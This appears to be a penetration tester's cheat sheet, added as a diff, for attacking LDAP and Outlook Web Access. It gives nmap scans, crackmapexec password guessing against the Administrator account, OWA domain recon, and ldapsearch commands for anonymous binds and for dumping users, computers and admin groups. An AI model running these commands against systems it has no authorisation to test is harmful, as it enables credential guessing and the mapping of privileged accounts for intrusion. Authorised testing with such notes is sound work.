@@ -1,0 +1,76 @@
+LDAP-OWA
+
+ip=10.0.0.10
+echo $ip
+
+shodan host $ip
+
+nmap -Pn -n -T4 --open $ip
+nmap -Pn -n -T4 --open -p389,636,3269 --script=ldap*,ssl* $ip
+---------------------------------------------------------------------------------------------------------------------
+
+crackmapexec ldap $ip -u Administrator -p passwords.txt
+crackmapexec ldap $ip --port 636 -u Administrator -p passwords.txt
+---------------------------------------------------------------------------------------------------------------------
+
+# SprayingToolkit
+This will show the internal domain name.
+atomizer.py owa 'https://webmail.acme.com/Autodiscover' --recon
+---------------------------------------------------------------------------------------------------------------------
+
+# Apache Directory Studio, using valid creds, port 636
+File > New > LDAP Browser > LDAP Connection > Next
+Connection name: 636
+Hostname: target IP
+Port: 636
+Encryption method: Use SSL
+Authentication Method: Simple Authentication
+User: domain\user Check Authentication
+
+- Search
+LDAP - New Search
+Search Name: admin accounts
+Connection > Browse: select the name you entered <636>
+Search Base > Browse: select the root of the domain
+Filter: (cn=admin*)
+Returning Attributes: cn, mail, description
+Search results may take a few seconds to return.
+
+- Reuse a search
+Expand Searches in the bottom left lane
+Right-click > Copy Search
+Select Search > right-click > Paste Search
+Edit as needed > Apply and Close
+---------------------------------------------------------------------------------------------------------------------
+
+# Enumerate anonymous or null binding
+ldapsearch -x -b "dc=acme,dc=com" "*" -h $ip | awk '/dn: / {print $2}'
+
+# Unauthenticated Bind Enumeration (DN with no password)
+ldapsearch -x -D "cn=admin,dc=acme,dc=com" -s sub "cn=*" -h $ip | awk '/uid: /{print $2}' | nl
+
+#  Enumerate anonymous or null binding
+ldapsearch -x -h ldap://hostname:port/ -b "searchbase" -s sub
+
+# Extract  users
+ldapsearch -x -h <IP> -D 'DOMAIN\username' -w 'password' -b "CN=Users,DC=acme,DC=com"
+
+# Extract computers
+ldapsearch -x -h <IP> -D 'DOMAIN\username' -w 'password' -b "CN=Computers,DC=<SUBDOMAIN>,DC=<TDL>"
+
+# Extract my info
+ldapsearch -x -h <IP> -D 'DOMAIN\username' -w 'password' -b "CN=<MY NAME>,CN=Users,DC=<SUBDOMAIN>,DC=<TDL>"
+
+# Extract domain admins
+ldapsearch -x -h <IP> -D 'DOMAIN\username' -w 'password' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TDL>"
+
+# Extract administrators
+ldapsearch -x -h <IP> -D 'DOMAIN\username' -w 'password' -b "CN=Administrators,CN=Builtin,DC=<SUBDOMAIN>,DC=<TDL>"
+
+# Extract remote desktop group
+ldapsearch -x -h <IP> -D 'DOMAIN\username' -w 'password' -b "CN=Remote Desktop Users,CN=Builtin,DC=<SUBDOMAIN>,DC=<TDL>"
+---------------------------------------------------------------------------------------------------------------------
+
+https://github.com/franc-pentest/ldeep
+https://github.com/codewatchorg/PowerSniper
+
